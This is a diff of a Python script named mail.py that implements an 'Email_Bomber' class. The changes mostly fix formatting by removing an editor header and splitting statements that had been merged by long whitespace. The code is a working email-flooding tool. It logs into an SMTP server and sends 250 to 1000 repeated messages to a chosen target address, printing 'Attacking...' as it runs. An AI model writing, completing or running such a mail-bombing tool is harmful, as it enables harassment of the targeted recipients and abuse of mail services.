@@ -1,4 +1,3 @@
-nano 7.2                                                            mail.py                                                            Modified
 '''imports'''
 import smtplib
 import sys
@@ -56,7 +55,8 @@ class Email_Bomber:
             self.amount = None
             if self.mode == int(1):
                 self.amount = int(1000)
-            elif self.mode == int(2):                                                                                                                                  self.amount = int(500)
+            elif self.mode == int(2):
+                self.amount = int(500)
             elif self.mode == int(3):
                 self.amount = int(250)
             else:
@@ -90,9 +90,11 @@ class Email_Bomber:
 
             self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
             ''' % (self.fromAddr, self.target, self.subject, self.message)
+
             self.s = smtplib.SMTP(self.server, self.port)
             self.s.ehlo()
-            self.s.starttls()                                                                       self.s.ehlo()
+            self.s.starttls()
+            self.s.ehlo()
             self.s.login(self.fromAddr, self.fromPwd)
         except Exception as e:
             print(f'ERROR: {e}')
@@ -109,9 +111,11 @@ class Email_Bomber:
         print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
         for email in range(self.amount+1):
             self.send()
-        self.s.close()                                                                          print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
+        self.s.close()
+        print(bcolors.RED + '\n+[+[+[ Attack finished ]+]+]+')
         sys.exit(0)
-                                                                                        
+
+
 if __name__=='__main__':
     banner()
     bomb = Email_Bomber()
